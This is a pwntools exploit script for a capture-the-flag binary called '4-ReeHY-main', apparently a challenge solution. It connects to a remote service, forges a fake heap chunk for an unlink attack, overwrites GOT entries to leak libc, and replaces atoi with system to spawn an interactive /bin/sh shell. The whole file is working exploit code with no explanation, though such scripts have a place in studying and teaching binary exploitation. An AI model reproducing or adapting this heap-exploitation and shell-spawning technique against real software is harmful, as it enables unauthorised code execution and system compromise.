from pwn import *
p = process("./4-ReeHY-main")
p = remote("111.198.29.45", "30002")
e = ELF("./4-ReeHY-main")
#context.log_level = 'debug'
p.recv()
p.sendline("1")
libc = ELF("/libc64.so.6")


def creat(sz, cun, ct):
    p.sendlineafter("$ ", '1')
    p.sendlineafter('\n', str(sz))
    p.sendlineafter('\n', str(cun))
    p.sendlineafter('\n', ct)


def delete(cun):
    p.sendlineafter("$ ", '2')
    p.sendlineafter('\n', str(cun))


def edit(cun, ct):
    p.sendlineafter("$ ", '3')
    p.sendlineafter('\n', str(cun))
    p.sendafter('\n', ct)


creat(0x98, 1, 'a')
creat(0x88, 2, 'b')
creat(0x88, 3, 'b')
delete(-2)
creat(20, 4, p32(0x200) * 4)
fake_chunk = ''
fake_chunk += p64(0) + p64(0x91)
fake_chunk += p64(0x6020f0 - 0x18) + p64(0x6020f0 - 0x10)
fake_chunk += p64(0) * 2 * 7 + p64(0x90) + p64(0x90)
edit(1, fake_chunk)
delete(2)
payload = p64(0) * 3
payload += p64(e.got['free']) + p64(1)
payload += p64(e.got['puts']) + p64(1)
payload += p64(e.got['atoi']) + p64(1)
edit(1, payload)
edit(1, p64(e.plt['puts']))
creat(0x8, 4, 'a' * 7)
delete(4)
p.recvuntil('\n')
libc_base = u64(p.recv(6) + '\x00\x00') - 360 - 0X3C4B20
system = libc_base + libc.symbols['system']
# print hex(libc_base)
edit(3, p64(system))
p.sendlineafter("$ ", '/bin/sh\x00')
p.interactive()